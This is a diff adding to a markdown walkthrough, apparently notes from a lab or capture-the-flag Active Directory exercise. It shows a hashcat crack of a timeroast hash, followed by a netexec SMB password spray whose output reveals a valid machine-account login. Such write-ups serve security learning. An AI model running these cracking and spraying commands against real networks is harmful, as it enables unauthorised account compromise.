@@ -181,4 +181,23 @@ hashcat -m 31300 timeroast.hash /usr/share/wordlists/rockyou.txt
 $sntp-ms$bdcab56c7ea8caf83df9e6562e7fee9c$1c0111e900000000000a09324c4f434cee11f97684146f22e1b8428bffbfcd0aee1205969be30a25ee1205969be34839:P@ssw0rd!
 ```
 
-This doesnt not tell me which user t
+This doesnt not tell me which user this is for, so ill have to spray it against the users i have!
+
+# Password spray
+
+```python
+nxc smb EC2AMAZ-A5O4OL8.past.local -u users.txt -p 'P@ssw0rd!' --continue-on-success
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\Administrator:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\Guest:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\krbtgt:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\DefaultAccount:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\tyler:P@ssw0rd! STATUS_ACCOUNT_RESTRICTION 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\EC2AMAZ-A5O4OL8$:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [+] past.local\APPDEV01$:P@ssw0rd! 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\WEBDEV01$:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\DEV01$:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\ryan:P@ssw0rd! STATUS_LOGON_FAILURE
+```
+
+Looks li
